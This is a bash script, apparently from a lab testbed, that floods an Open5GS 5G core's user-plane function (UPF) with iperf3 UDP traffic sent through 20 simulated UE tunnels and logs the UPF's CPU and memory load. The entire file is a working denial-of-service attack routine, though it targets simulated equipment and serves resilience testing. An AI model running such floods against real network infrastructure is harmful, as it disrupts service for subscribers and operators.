#!/bin/bash
# ============================================================
# UPF Flooding Attack Script — Option B (Isolated UPF)
# Uses iperf3 for high-throughput UDP flooding via UE tunnels
# Usage: ./upf_flood_iperf3.sh [duration_seconds]
# ============================================================

DURATION="${1:-60}"
UE_COUNT=20
CP_NS="open5gs"
UP_NS="open5gs-upf"
OUTPUT_DIR="$HOME/upf_attack_iperf_$(date +%Y%m%d_%H%M%S)"
CSV_FILE="$OUTPUT_DIR/metrics.csv"
IPERF_SERVER="10.194.182.207 -p 32034" # The UPF's ogstun IP that UEs can reach
RATE="100M" # 100 Mbps per UE

mkdir -p "$OUTPUT_DIR"
echo "timestamp,namespace,pod,cpu_m,mem_mi" > "$CSV_FILE"

echo "=================================================="
echo "  UPF Flooding Attack (iperf3 UDP)"
echo "  CP Namespace: $CP_NS | UP Namespace: $UP_NS"
echo "  Duration: ${DURATION}s | UEs: $UE_COUNT @ $RATE each"
echo "=================================================="

# Ensure iperf3 is ready in the UPF
echo "[*] Starting iperf3 server daemon in UPF..."
kubectl exec -n $UP_NS deploy/open5gs-upf -- sh -c "pkill iperf3; iperf3 -s -D" 2>/dev/null

# Baseline
echo "[*] Capturing baseline (5s wait)..."
sleep 5
BASELINE_CPU=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $2}')
BASELINE_MEM=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $3}')
if [ -z "$BASELINE_CPU" ]; then BASELINE_CPU="0m"; BASELINE_MEM="0Mi"; fi
echo "    [BASELINE] UPF: CPU=$BASELINE_CPU  MEM=$BASELINE_MEM"

# Start flood via all UE tunnels
echo "[*] Starting iperf3 UDP flood via $UE_COUNT UE tunnels..."
kubectl exec -n $CP_NS deploy/ueransim-gnb-ues -- sh -c "
for i in \$(seq 0 $((UE_COUNT-1))); do
  TUN_IP=\$(ip addr show uesimtun\${i} 2>/dev/null | grep 'inet ' | awk '{print \$2}' | cut -d/ -f1)
  if [ -n \"\$TUN_IP\" ]; then
    iperf3 -c $IPERF_SERVER -u -b $RATE -B \$TUN_IP -t $DURATION >/dev/null 2>&1 &
  fi
done
wait" &
FLOOD_PID=$!
echo "[*] Flood started (PID=$FLOOD_PID)"
echo ""

# Monitor loop
ELAPSED=0
PEAK_CPU=0
while [ $ELAPSED -lt $DURATION ]; do
  TIMESTAMP=$(date +%s)
  
  # Collect UPF (UP) namespace metrics
  kubectl top pod -n $UP_NS --no-headers 2>/dev/null | while read POD CPU MEM; do
    if echo "$POD" | grep -q 'upf'; then
        CPU_VAL=$(echo "$CPU" | sed 's/m//')
        MEM_VAL=$(echo "$MEM" | sed 's/Mi//')
        echo "$TIMESTAMP,$UP_NS,$POD,$CPU_VAL,$MEM_VAL" >> "$CSV_FILE"
    fi
  done
  
  UPF_CPU=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $2}')
  UPF_MEM=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $3}')
  if [ -z "$UPF_CPU" ]; then UPF_CPU="N/A"; UPF_MEM="N/A"; fi

  printf "\r  [%3ds/%3ds] UPF: CPU=%-8s MEM=%-8s" \
    "$ELAPSED" "$DURATION" "$UPF_CPU" "$UPF_MEM"
  
  sleep 5
  ELAPSED=$((ELAPSED + 5))
done

echo ""
echo ""
echo "[*] Stopping flood..."
kill $FLOOD_PID 2>/dev/null
kubectl exec -n $CP_NS deploy/ueransim-gnb-ues -- sh -c "pkill iperf3" 2>/dev/null
kubectl exec -n $UP_NS deploy/open5gs-upf -- sh -c "pkill iperf3" 2>/dev/null

# Final metrics
sleep 3
PEAK_CPU=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $2}')
PEAK_MEM=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $3}')
if [ -z "$PEAK_CPU" ]; then PEAK_CPU="N/A"; PEAK_MEM="N/A"; fi

# Generate summary
echo "" >> "$OUTPUT_DIR/attack_summary.txt"
echo "=== iPerf3 UDP FLOOD ATTACK SUMMARY ===" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Date: $(date)" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Duration: ${DURATION}s" >> "$OUTPUT_DIR/attack_summary.txt"
echo "UEs used: $UE_COUNT @ $RATE UDP each" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Baseline UPF CPU: $BASELINE_CPU" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Final UPF CPU:    $PEAK_CPU" >> "$OUTPUT_DIR/attack_summary.txt"

awk -F',' 'NR>1 && $2=="open5gs-upf" {
  cpu[$3]+=$4; mem[$3]+=$5; count[$3]++
} END {
  for (pod in cpu) {
    if (count[pod] > 0) {
        printf "UPF avg: CPU=%.1fm  MEM=%.1fMi (samples=%d)\n", cpu[pod]/count[pod], mem[pod]/count[pod], count[pod]
    }
  }
}' "$CSV_FILE" >> "$OUTPUT_DIR/attack_summary.txt"

echo ""
echo "=================================================="
echo "  Attack Complete!"
echo "  Baseline UPF: CPU=$BASELINE_CPU  MEM=$BASELINE_MEM"
echo "  Final UPF:    CPU=$PEAK_CPU      MEM=$PEAK_MEM"
echo "  Summary:"
cat "$OUTPUT_DIR/attack_summary.txt"
echo "=================================================="
